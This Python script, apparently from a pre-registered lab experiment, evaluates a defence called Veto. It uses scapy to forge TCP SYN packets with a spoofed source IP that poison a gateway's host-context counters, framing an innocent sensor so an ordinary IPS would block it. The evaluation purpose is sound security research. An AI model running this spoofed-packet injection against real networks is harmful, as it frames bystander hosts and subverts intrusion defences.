"""PREREG §9 LIVE E3/E4: host-context poisoning on the isolated lab only (own devices, no internet on the lab side).

Sends TCP SYNs whose IP source is the VICTIM sensor (--victim) to --n distinct lab peers in 192.168.77.0/24, so the
Veto gateway meters them as the sensor fanning out to new peers and the sensor's host-context newpeer/n counters rise.
This is the pre-registered injection: E3 stays within budget (n<=10 per 240 s key window), E4 goes over (n=50). The
real sensor keeps publishing; we then read, from the gateway log, the sensor's own next benign flow -- its raw score
(what an ordinary IPS blocks on) and its certified lower bound (what Veto blocks on). The claim: injection lifts the
score over tau (ordinary IPS would block the innocent sensor) while the lower bound stays under tau (Veto does not).

Usage: sudo-caps python3 e3_inject.py --victim 192.168.4.2 --n 10 --iface wlo1   (needs cap_net_raw)
"""
import argparse
import time

from scapy.all import IP, TCP, send  # scapy only; raw socket needs cap_net_raw on the interpreter


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--victim", required=True, help="spoofed IP source = the sensor we are framing")
    ap.add_argument("--base", default="192.168.77.", help="lab peer /24 the forged flows fan out to")
    ap.add_argument("--first", type=int, default=20, help="first peer host octet")
    ap.add_argument("--n", type=int, default=10, help="distinct peers = injected fan-out flows (E3<=10, E4=50)")
    ap.add_argument("--dport", type=int, default=80)
    a = ap.parse_args()
    assert a.base.startswith("192.168."), "lab subnets only"
    pkts = [IP(src=a.victim, dst=f"{a.base}{a.first + i}") / TCP(sport=40000 + i, dport=a.dport, flags="S")
            for i in range(a.n)]
    t0 = int(time.time() * 1000)
    send(pkts, verbose=False)  # kernel routes by dst (192.168.77/24 -> gateway); src stays spoofed
    print(f"{t0} injected {a.n} forged flows src={a.victim} -> {a.base}{a.first}..{a.first + a.n - 1}:{a.dport}")


if __name__ == "__main__":
    main()
